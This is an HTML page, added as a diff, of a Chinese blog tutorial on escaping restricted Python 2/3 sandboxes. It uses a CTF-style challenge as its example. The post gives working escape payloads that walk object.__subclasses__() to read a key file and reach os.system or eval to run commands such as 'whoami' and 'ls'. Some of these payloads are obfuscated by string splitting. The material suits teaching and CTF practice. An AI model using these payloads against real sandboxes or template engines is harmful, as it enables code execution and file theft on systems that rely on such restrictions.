@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="0verWatch" />
+
+
+
+<meta name="description" content="基础一些函数需要了解一下，这篇文章讲的已经很详细">
+<meta name="keywords" content="沙盒绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python沙盒绕过">
+<meta property="og:url" content="0verwatch.top/python-sandbox-bypass.html">
+<meta property="og:site_name" content="0verWatch&#39;s Blog">
+<meta property="og:description" content="基础一些函数需要了解一下，这篇文章讲的已经很详细">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/07/ktIJLd.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/08/kNEfSK.png">
+<meta property="og:updated_time" content="2019-02-08T08:48:01.859Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Python沙盒绕过">
+<meta name="twitter:description" content="基础一些函数需要了解一下，这篇文章讲的已经很详细">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/02/07/ktIJLd.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="0verWatch&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/crystal.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Python沙盒绕过 | 0verWatch&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-56ff76c972fc0cf9"></script>
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?e9bf2f4b24d981680e6d59ced18982b0";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">0verWatch</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">学习本无底，前进莫彷徨</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">归档</a></li>
+                        
+                            <li><a href="/tags/">分类&amp;标签</a></li>
+                        
+                            <li><a href="/friends/">友链</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Coding" href="https://coding.net/u/Ov3rWatch" title="Coding"></a>
+                            
+                                <a class="fa SegmentFault" href="https://segmentfault.com/" title="SegmentFault"></a>
+                            
+                                <a class="fa CSDN" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CRC32爆破/">CRC32爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux安全/">Linux安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux常用命令/">Linux常用命令</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql安全配置/">Mysql安全配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Social/">Social</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Yii/">Yii</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/algorithm/">algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/二分查找/">二分查找</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反序列化/">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/微机实验/">微机实验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构/">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/服务器运维/">服务器运维</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/汇编/">汇编</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/沙盒绕过/">沙盒绕过</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/流量分析/">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境部署/">环境部署</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编程语言/">编程语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网站渗透/">网站渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/计算机网路/">计算机网路</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://202.119.201.199/">CumtCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.nuptzj.cn">NuptCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://www.jarvisoj.com">Jarvis OJ</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.codemonster.cn/home">MOCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.bugku.com/">BugkuCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.shiyanbar.com/ctf/practice">实验吧</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://xz.aliyun.com/">先知社区</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://shentoushi.top/">渗透师导航</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://skysec.top/">一叶飘零</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.yytpublic.cn">LaurenceYu</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://chun.ringfall.me">ringfall</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">0verWatch</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">0verWatch</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">学习本无底，前进莫彷徨</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">归档</a></li>
+                
+                    <li><a href="/tags/">分类&amp;标签</a></li>
+                
+                    <li><a href="/friends/">友链</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Coding" target="_blank" href="https://coding.net/u/Ov3rWatch" title="Coding"></a>
+                            
+                                <a class="fa SegmentFault" target="_blank" href="https://segmentfault.com/" title="SegmentFault"></a>
+                            
+                                <a class="fa CSDN" target="_blank" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-python-sandbox-bypass" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/python-sandbox-bypass.html" class="article-date">
+      <time datetime="2019-02-04T08:34:04.000Z" itemprop="datePublished">2019-02-04</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Python沙盒绕过
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/沙盒绕过/">沙盒绕过</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/沙盒绕过/">沙盒绕过</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>一些函数需要了解一下，这篇文章讲的已经很详细<a id="more"></a>了:<a href="https://xz.aliyun.com/t/2308#toc-12，概括一下分别是下面的函数" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12，概括一下分别是下面的函数</a></p>
+<ul>
+<li><code>__class__</code> :返回一个实例所属的类</li>
+<li><code>__bases__</code> :返回一个类<code>直接</code>所继承的类（元组形式）</li>
+<li><code>__mro__</code> :列出解析方法的调用顺序，类似于bases</li>
+<li><code>__subclasses__()</code>：返回子类列表</li>
+<li><code>__dict__</code> ： 列出当前属性/函数的字典</li>
+<li><code>func_globals</code>：返回一个包含函数全局变量的字典引用</li>
+<li><code>__globals__</code>:返回一个当前空间下能使用的模块，方法和变量的字典</li>
+</ul>
+<p>上面的模块中可以尝试理解mro和bases之间的区别，两个的东西还是有点区别的，只是作用在绕过上功能类似。个人感觉mro的发展过程有点像从dfs编程bfs。。。</p>
+<h3 id="dir方法"><a href="#dir方法" class="headerlink" title="dir方法"></a>dir方法</h3><ul>
+<li>dir()在没有参数的时候返回本地作用域中的名称列表</li>
+<li>dir()在有参数的时候返回该对象的有效属性列表</li>
+</ul>
+<p>对比一下下面的例子就知道了，以py2为例：</p>
+<p><img src="https://s2.ax1x.com/2019/02/07/ktIJLd.png" alt="ktIJLd.png"></p>
+<h3 id="内联模块"><a href="#内联模块" class="headerlink" title="内联模块"></a>内联模块</h3><p>python中可以直接运行一些函数，例如<code>int(),list()</code>等等。这些函数可以在内联模块中可以查到。</p>
+<p>常用的有下面两个：<code>__import__</code>以及<code>__builtins__</code>，但是在py2里面内置模块名字叫<code>__builtin__</code>，py3改名叫<code>__builtins__</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line">In [<span class="number">4</span>]: __builtin__</span><br><span class="line">Out[<span class="number">4</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: __builtins__</span><br><span class="line">Out[<span class="number">5</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="comment">#python 3.6</span></span><br><span class="line">In [<span class="number">2</span>]: __builtin__                                                                                             </span><br><span class="line">Out[<span class="number">2</span>]: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: __builtins__                                                                                    </span><br><span class="line">Out[<span class="number">3</span>]: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
+<p>在py2中，在主模块<code>main</code>中，<code>__builtins__</code>是对内建模块<code>__builtin__</code>本身的引用，即<code>__builtins__</code>完全等价于<code>__builtin__</code>，二者完全是一个东西，不分彼此。</p>
+<p>非主模块<code>main</code>中，<code>__builtins__</code>仅是对<code>__builtin__.__dict__</code>的引用，而非<code>__builtin__</code>本身</p>
+<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>如果导入的模块a中有着另一个模块b，那么，我们可以用<code>a.b</code>的方法或者<code>a.__dict__[b&lt;name&gt;]</code>的方法间接访问模块b。</p>
+<h3 id="弄一个沙盒环境"><a href="#弄一个沙盒环境" class="headerlink" title="弄一个沙盒环境"></a>弄一个沙盒环境</h3><p>一般读取目录的时候需要使用到<code>os.system</code>函数，这样的一句话这样写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">'os'</span>).system(<span class="string">'dir'</span>)</span><br></pre></td></tr></table></figure>
+<p>然后我们可以把一些关键模块给删掉</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"><span class="comment"># 管理员删了很多的危险函数</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'...'</span>]</span><br></pre></td></tr></table></figure>
+<p>这时候import已经失效了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: __import__ <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
+<p>但是可以用 reload来重新导入模块。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br></pre></td></tr></table></figure>
+<p>但是请注意，在<strong>Python 3.0把reload内置函数移到了import库模块中。</strong>所以python3中，这个方法已经失效了</p>
+<p>所以在制作py2.7沙箱的时候，还需要删除<code>reload</code>的方法。</p>
+<h3 id="一道题目"><a href="#一道题目" class="headerlink" title="一道题目"></a>一道题目</h3><p>这个题目很常见了，py2的环境，自己拿来练下手,最后是读取当前文件夹下的key文件，删除了很多关键函数，也包括了<code>reload</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>,</span><br><span class="line">              <span class="string">'file'</span>,</span><br><span class="line">              <span class="string">'execfile'</span>,</span><br><span class="line">              <span class="string">'compile'</span>,</span><br><span class="line">              <span class="string">'reload'</span>,</span><br><span class="line">              <span class="string">'__import__'</span>,</span><br><span class="line">              <span class="string">'eval'</span>,</span><br><span class="line">              <span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Go Ahead, Expoit me &gt;;D'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">'S+'</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="keyword">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span> + inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Return Value:'</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    	<span class="keyword">print</span> <span class="string">'Exception:'</span>, e</span><br></pre></td></tr></table></figure>
+<h4 id="用file类去读取文件"><a href="#用file类去读取文件" class="headerlink" title="用file类去读取文件"></a>用file类去读取文件</h4><p>面对这个时候我们已经不能使用<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>去读取文件但我们可以利用object类去寻找file类去读取文件内容</p>
+<p>思路是这样的：</p>
+<ol>
+<li>随便找一个内置类对象用<code>__class__</code>拿到他所对应的类</li>
+<li>用<code>__bases__</code>拿到基类（<code>&lt;class &#39;object&#39;&gt;</code>）</li>
+<li>用<code>__subclasses__()</code>拿到子类列表</li>
+<li>在子类列表中直接寻找可以利用的类</li>
+</ol>
+<p>也就是</p>
+<p><code>().__class__.__bases__[0].__subclasses__()[40]</code></p>
+<p>但是面对<code>__subclasses__</code>的子类太多找不到对应的file类怎么办？可以这样去寻找</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'file'</span>   <span class="comment">#这里填写你要寻找的类即可</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        <span class="keyword">print</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>然后可以用dir函数查看里面的方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>])</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__enter__'</span>, <span class="string">'__exit__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'close'</span>, <span class="string">'closed'</span>, <span class="string">'encoding'</span>, <span class="string">'errors'</span>, <span class="string">'fileno'</span>, <span class="string">'flush'</span>, <span class="string">'isatty'</span>, <span class="string">'mode'</span>, <span class="string">'name'</span>, <span class="string">'newlines'</span>, <span class="string">'next'</span>, <span class="string">'read'</span>, <span class="string">'readinto'</span>, <span class="string">'readline'</span>, <span class="string">'readlines'</span>, <span class="string">'seek'</span>, <span class="string">'softspace'</span>, <span class="string">'tell'</span>, <span class="string">'truncate'</span>, <span class="string">'write'</span>, <span class="string">'writelines'</span>, <span class="string">'xreadlines'</span>]</span><br></pre></td></tr></table></figure>
+<p>所以最后的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br><span class="line"><span class="comment">#同样的效果</span></span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure>
+<p>等价于</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure>
+<p>注意py3已经移除了file了这种方法也只能在py3里面使用</p>
+<h4 id="利用内置函数执行命令"><a href="#利用内置函数执行命令" class="headerlink" title="利用内置函数执行命令"></a>利用内置函数执行命令</h4><p>可以根据第一种的思路接着探索。第一种止步于把内置的对象列举出来，其实可以用<code>__globals__</code>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），查找<code>os</code>模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'os'</span>   <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">(&lt;class 'site._Printer'&gt;, 71)</span></span><br><span class="line"><span class="string">(&lt;class 'site.Quitter'&gt;, 76)</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+<p>然后构造继承链</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>
+<p>但是这个方法也只能在py2里面实现，同样在前面的SSTI注入中vulhub给的测试payload用的是<code>class &#39;warnings.catch_warnings&#39;</code>这一个类，同样这个类里面也有os模块，可以像下面这个样子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]</span><br><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>))</span><br><span class="line"><span class="comment"># func_globals:返回一个包含函数全局变量的字典引用；</span></span><br></pre></td></tr></table></figure>
+<p>上面的方法大都有限制，py2跟py3可以使用<code>__builtins__</code>通吃</p>
+<p>py3</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">64</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure>
+<p>py2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure>
